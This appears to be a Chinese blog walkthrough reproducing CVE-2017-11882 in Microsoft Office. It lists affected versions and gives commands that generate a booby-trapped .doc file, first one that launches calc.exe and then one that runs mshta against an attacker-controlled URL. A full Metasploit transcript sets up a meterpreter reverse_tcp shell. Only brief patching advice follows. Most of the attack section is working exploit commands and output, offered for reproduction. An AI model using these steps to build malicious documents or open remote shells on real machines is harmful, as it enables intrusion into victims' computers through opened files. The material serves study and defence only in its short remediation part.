> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/Hi-blog/p/7878054.html)

**阅读目录**

*   [Preface](#_label00)
*   [影响版本](#_label01)
*   [复现过程](#_label02)

*   [生成漏洞 doc 文件弹计算器](#_label20)
*   [生成漏洞 doc 文件拿 shell](#_label21)

*   [漏洞修复](#_label03)
*   [参考](#_label04)

[回到顶部](#_labelTop)

**Preface**
-----------

　　这几天关于 Office 的一个远程代码执行漏洞很流行，昨天也有朋友发了相关信息，于是想复现一下看看，复现过程也比较简单，主要是简单记录下。

　　利用脚本 [Github 传送地址](https://github.com/starnightcyber/CVE-2017-11882) ，后面的参考链接都有成功的比较详细的案例了。

　　主要是要用到如图中的两个脚本，example 文件夹中有个 doc，应该直接打开就能弹计算器了。

![](https://images2017.cnblogs.com/blog/624934/201711/624934-20171122113928524-1237576422.png)

[回到顶部](#_labelTop)

影响版本
----

*   Office 365
*   Microsoft Office 2000   
*   Microsoft Office 2003   
*   Microsoft Office 2007 Service Pack 3
*   Microsoft Office 2010 Service Pack 2
*   Microsoft Office 2013 Service Pack 1
*   Microsoft Office 2016

[回到顶部](#_labelTop)

**复现过程**
--------

国外最先发布的 poc 地址：https://github.com/embedi/CVE-2017-11882

这里我们使用的是 Ridter 师傅改进过的脚本：https://github.com/Ridter/CVE-2017-11882/

[回到顶部](#_labelTop)

### **生成漏洞 doc 文件弹计算器**

　　生成漏洞 doc 文件，可以弹出计算器如下：（脚本在 Github 传送地址）

```
starnight:CVE-2017-11882 starnight$ python Command_CVE-2017-11882.py -c "cmd.exe /c calc.exe" -o test.doc
[*] Done ! output file >> test.doc <<
```

　　用命令生成 test.doc 后，用 Offcie 2013 打开这个文件，可以看到在打开 doc 文件的时候，弹出计算器。

![](https://images2017.cnblogs.com/blog/624934/201711/624934-20171122104018899-1902346095.png)

 　　除了可以弹计算器外，还能获取 shell。

[回到顶部](#_labelTop)

### **生成漏洞 doc 文件拿 shell**

 　这里我们参考链接 2，使用 metasploit，将脚本 [PS_shell.rb](https://github.com/starnightcyber/CVE-2017-11882/blob/master/PS_shell.rb "PS_shell.rb") 放到 metasploit exploit 的某个路径下：

　　我的 kali 下的 metasploit 所在路径是：/usr/share/metasploit-framework， 可以放在如下目录：（这里我们新创建一个 new-exps 目录存放这个脚本）

```
root@kali:/usr/share/metasploit-framework/modules/exploits/windows/new-exps# pwd
/usr/share/metasploit-framework/modules/exploits/windows/new-exps
root@kali:/usr/share/metasploit-framework/modules/exploits/windows/new-exps# ls PS_shell.rb
```

　　这样在启动 msf 时就能直接使用了：

```
msf > use exploit/windows/new-exps/PS_shell
```

　　漏洞利用过程：

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
msf > use exploit/windows/new-exps/PS_shell 
msf exploit(PS_shell) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(PS_shell) > set lhost 192.168.1.102
lhost => 192.168.1.102
msf exploit(PS_shell) > set uripath abc
uripath => abc
msf exploit(PS_shell) > exploit
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 192.168.1.102:4444 
msf exploit(PS_shell) > [*] Using URL: http://0.0.0.0:8080/abc
[*] Local IP: http://192.168.1.102:8080/abc
[*] Server started.
[*] Place the following DDE in an MS document:
mshta.exe "http://192.168.1.102:8080/abc"
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

　　从上面可以看出，我们要连接到这个地址：http://192.168.1.102:8080/abc

　　我们需要用上面那个脚本重新生成这样一个存在漏洞的 doc 文件：　　

```
starnight:CVE-2017-11882 starnight$ python Command_CVE-2017-11882.py -c "mshta http://192.168.1.102:8080/abc" -o test.doc
[*] Done ! output file >> test.doc <<
```

　　再用 Office 打开这个 doc，就能拿到 meterpreter 了：

![](https://images2017.cnblogs.com/blog/624934/201711/624934-20171122113100430-173114849.png)

![](https://images2017.cnblogs.com/blog/624934/201711/624934-20171122113410571-1535679967.png)

　　OK， 利用过程就这样吧。（右键在新标签页中打开图片查看更清晰哦）

　　更多手法请参考：

　　　　[CVE-2017-11882 漏洞复现和利用](http://www.freebuf.com/vuls/154978.html)

[回到顶部](#_labelTop)

漏洞修复
----

```
(1)下载https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882  更新补丁进行修补
 
(2)开启Windows Update功能，定期对系统进行自动更新
```

[回到顶部](#_labelTop)

参考
--

　　[CVE-2017-11882 利用](https://evi1cg.me/archives/CVE_2017_11882_exp.html)

　　[CVE-2017-11882 的复现、利用技巧以及修复方案](https://mp.weixin.qq.com/s/o3Psnsl8OBmVdkUrvcTLsw)